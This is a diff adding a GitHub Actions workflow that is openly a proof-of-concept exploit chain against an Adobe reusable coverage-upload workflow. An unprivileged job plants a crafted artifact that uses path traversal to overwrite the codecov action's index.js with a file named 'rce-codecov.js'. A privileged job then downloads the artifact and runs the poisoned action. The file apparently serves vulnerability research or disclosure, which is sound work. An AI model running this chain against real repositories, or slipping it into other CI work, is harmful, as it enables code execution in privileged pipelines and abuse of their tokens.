@@ -1,0 +1,80 @@
+name: mirror-coverage-chain
+
+# Target-shaped reproduction of:
+#   adobe/<repo>/.github/workflows/dependabot-coverage-upload.yml   (issue_comment, admin/maintain gate)
+#     -> adobe/aio-reusable-workflows/.github/workflows/dependabot-coverage-upload.yml@main
+#
+# The maintainer's "/upload-coverage" comment is the only simulated element (here: manual
+# dispatch). Everything else is byte-for-byte the reusable workflow's logic: artifact
+# discovery by name prefix + workflow_run.head_sha, PR-head checkout, download by run-id,
+# then the codecov/codecov-action@v4 step.
+#
+# The artifact is planted by an UNPRIVILEGED job whose token is read-only, exactly like a
+# fork PR's own workflow run (enable "Show token permissions" in the log).
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  attacker-run:
+    name: "unprivileged run: plant crafted coverage artifact"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+      - name: install artifact client
+        working-directory: .github/actions/plant
+        run: npm install @actions/artifact@2.3.2 --no-save --silent
+      - name: plant crafted artifact
+        uses: ./.github/actions/plant
+        env:
+          INPUT_EXTRACT_DIR: "../gab-poc-adobe-customer-profile-coverage/gab-poc-adobe-customer-profile-coverage/coverage-report-ubuntu-latest-20.x"
+        with:
+          name: coverage-report-ubuntu-latest-20.x
+          pairs: "poc-payload/rce-codecov.js->/home/runner/work/_actions/codecov/codecov-action/v4/dist/index.js"
+
+  privileged-consumer:
+    name: "privileged consumer (reusable coverage workflow shape)"
+    needs: attacker-run
+    runs-on: ubuntu-latest
+    permissions:
+      actions: read
+      contents: read
+      pull-requests: write
+    steps:
+      - name: Get PR head SHA
+        id: pr
+        run: |
+          set -euo pipefail
+          SHA=$(gh api repos/$GITHUB_REPOSITORY/commits/HEAD --jq '.sha')
+          echo "sha=$SHA" >> $GITHUB_OUTPUT
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Checkout PR head
+        uses: actions/checkout@v4
+      - name: Find original CI run
+        id: run
+        run: |
+          set -euo pipefail
+          RUN_ID=$(gh api "repos/$GITHUB_REPOSITORY/actions/artifacts?per_page=100" \
+            --jq "[.artifacts[] | select(.name | startswith(\"coverage-report-ubuntu-latest-\")) | select(.workflow_run.head_sha == \"$HEAD_SHA\")] | first | .workflow_run.id")
+          echo "found_run_id=$RUN_ID"
+          echo "run_id=$RUN_ID" >> $GITHUB_OUTPUT
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          HEAD_SHA: ${{ steps.pr.outputs.sha }}
+      - name: Download coverage artifacts
+        id: download
+        uses: actions/download-artifact@v4
+        with:
+          pattern: coverage-report-ubuntu-latest-*
+          run-id: ${{ steps.run.outputs.run_id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Upload to Codecov
+        uses: codecov/codecov-action@v4
+        with:
+          token: dummy-codecov-token-poc-value
+          files: '**/lcov.info'
+          fail_ci_if_error: false
